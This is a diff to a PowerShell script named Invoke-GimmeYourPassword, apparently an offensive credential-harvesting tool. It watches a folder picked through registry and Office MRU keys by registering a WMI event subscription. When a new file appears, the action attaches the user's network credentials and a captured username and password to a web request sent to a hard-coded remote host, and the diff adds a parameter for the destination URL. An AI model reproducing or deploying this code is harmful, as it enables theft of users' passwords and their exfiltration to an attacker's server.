@@ -4,24 +4,25 @@ function obtain-path() {
     [int]$Source
     )
     
+       
         $pathSplit=$path.split("\")
-        $pathOnly= $pathSplit[0 .. $($pathSplit.length -2) ]
-        $pathOnly = $pathOnly -join "\"
+        $pathToMonitorDriverLetter=$pathSplit[0]
+        $pathOnly= $pathSplit[1 .. $($pathSplit.length -1) ]
+        foreach($item in $pathOnly) {
+                $FinalPath= '\\' + $item
+            }
+        $FinalPath = $FinalPath + '\\'    
         if ($source -eq 1) {
             #Non invoke chain
            #write-output "Source is equal to 1"
-            return $pathOnly
+            $FinalPath=$pathToMonitorDriverLetter+$finalPath
+            return $FinalPath
         }         
         elseif ($source -eq 2) {
             #Invoke chain 
-            $pathToMonitor = $pathOnly
-            $pathToMonitor = $pathToMonitor.split("\")
-            $pathToMonitorDriverLetter=$pathToMonitor[0]
-            $pathToMonitorPathRemainder=$pathToMonitor[1..$pathToMonitor.Length] -join "\\"
-            $pathToMonitorPathRemainder = "\\" + $pathToMonitorPathRemainder + "\\"
             $myarray=@()
             $myarray+=$pathToMonitorDriverLetter
-            $myarray+=$pathToMonitorPathRemainder
+            $myarray+=$finalPath
             return $myarray
         }
         
@@ -29,19 +30,19 @@ function obtain-path() {
 
 
 function search-keys { 
-    #Include an optional parameter. This will determine how the function obtain path works. 
+    #Include an optional parameter. This will determine how the function obtain path works. It will show which path will be monitored if invoke-gimme is ran. 
     #If the INVOKE flag is present we will set the source to two, as we need to return additional parameters for the temporary WMI portion. 
 	param (
 	[switch]$Invoke
 	)
     if (test-path "HKCU:\software\gimme")
 	{
-		$pathToMonitor="Z:/demo"
+		$pathToMonitor="Z:\demo"
 	}
 	elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
     {
         write-output "hit 2 MRU path exists"
-        $pathToMonitor="Z:/demo"
+        $pathToMonitor="Z:\demo"
     }
     #elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User #MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
 	#{
@@ -64,8 +65,8 @@ function search-keys {
     if ($Invoke)
 	{
 	#If Invoke present
+    
     $returnValues=obtain-path -source 2 -path $pathToMonitor    
-    $returnValues
     return $returnValues
     }
 	else 
@@ -81,14 +82,18 @@ function search-keys {
 function start-tempsubscription{
     param (
         [string]$pathToMonitorDriverLetter,
-        [string]$pathToMonitorPathRemainder
+        [string]$pathToMonitorPathRemainder,
+        [string]$URL
     )
+    $Target="http://$URL"
+    write-output $target
     $localComputerName=$env:COMPUTERNAME
     $query = ("Select * from __instanceCreationEvent within 10 Where targetinstance isa 'cim_datafile' and targetInstance.drive='$pathToMonitorDriverLetter' and targetInstance.Path='$pathToMonitorPathRemainder' and targetInstance.__server='$env:computername'  and not targetInstance.Filename LIKE '~$%'")
+    $action = {
+	$global:MyEVT=$event
+    write-host  "Event Occurred" 
+	write-host $Target
     
-    register-wmievent -query $query -sourceIdentifier "MonitorFiles3" -Debug -action { 
-    $global:MyEVT=$event
-    write-host  "event occurred" 
     $modFileName=$event.sourceEventArgs.newevent.TargetInstance.filename
     $modExtension=$event.sourceEventArgs.newevent.TargetInstance.extension
     $modDriveLetter=$event.sourceEventArgs.newevent.TargetInstance.Drive
@@ -103,22 +108,21 @@ function start-tempsubscription{
         $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
         $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
-        $result=$wc.downloadstring('https://200.200.32.134:443');
+        #$result=$wc.downloadstring("$Target");
+        $result=$wc.downloadstring('http://192.168.1.159');
         }
     
   }
-    }
-
-function Invoke-GimmeYourPassword {
+	   register-wmievent -query $query -sourceIdentifier "MonitorFiles3" -Debug -action $Action
+}
+    
+    function Invoke-GimmeYourPassword {
 	param (
         [Parameter(Mandatory=$True)]
-		[string]$URL
+		[string]$Destination
     )
-	$pathToMonitor=search-keys -Invoke
-    write-output $pathToMonitor[0]
-    write-output $pathToMonitor[1]
-    start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1]
-    #write-output $pathToMonitor[0]
-    #write-output $pathToMonitor
-    
-}
+	write-host $destination
+    Unregister-Event -SourceIdentifier MonitorFiles3
+    $pathToMonitor=search-keys -Invoke
+    start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1] -URL $destination
+   }
